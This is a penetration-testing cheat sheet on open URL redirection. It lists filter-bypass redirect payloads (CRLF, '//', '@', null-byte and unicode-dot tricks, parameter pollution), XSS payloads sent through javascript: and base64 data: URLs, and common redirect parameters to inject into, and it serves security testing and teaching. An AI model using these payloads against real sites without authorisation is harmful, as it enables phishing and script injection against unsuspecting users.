# Open URL Redirection

> Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.

## Fuzzing

Replace www.whitelisteddomain.tld from *Open-Redirect-payloads.txt* with a specific white listed domain in your test case

To do this simply modify the WHITELISTEDDOMAIN with value www.test.com to your test case URL.

```powershell
WHITELISTEDDOMAIN="www.test.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
```

## Exploitation

Using a whitelisted domain or keyword

```powershell
www.whitelisted.com.evil.com redirect to evil.com
```

Using CRLF to bypass "javascript" blacklisted keyword

```powershell
java%0d%0ascript%0d%0a:alert(0)
```

Using "//" to bypass "http" blacklisted keyword

```powershell
//google.com
```

Using "https:" to bypass "//" blacklisted keyword

```powershell
https:google.com
```

Using "\/\/" to bypass "//" blacklisted keyword (Browsers see \/\/ as //)

```powershell
\/\/google.com/
/\/google.com/
```

Using "%E3%80%82" to bypass "." blacklisted character

```powershell
//google%E3%80%82com
```

Using null byte "%00" to bypass blacklist filter

```powershell
//google%00.com
```

Using parameter pollution

```powershell
?next=whitelisted.com&next=google.com
```

Using "@" character, browser will redirect to anything after the "@"

```powershell
http://www.theirsite.com@yoursite.com/
```

Creating folder as their domain

```powershell
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

XSS from Open URL - If it's in a JS variable

```powershell
";alert(0);//
```

XSS from data:// wrapper

```powershell
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```

XSS from javascript:// wrapper

```powershell
http://www.example.com/redirect.php?url=javascript:prompt(1)
```

## Common injection parameters

```powershell
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```

## Thanks to

* filedescriptor
* [OWASP - Unvalidated Redirects and Forwards Cheat Sheet](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
* [Cujanovic - Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
* [Pentester Land - Open Redirect Cheat Sheet](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
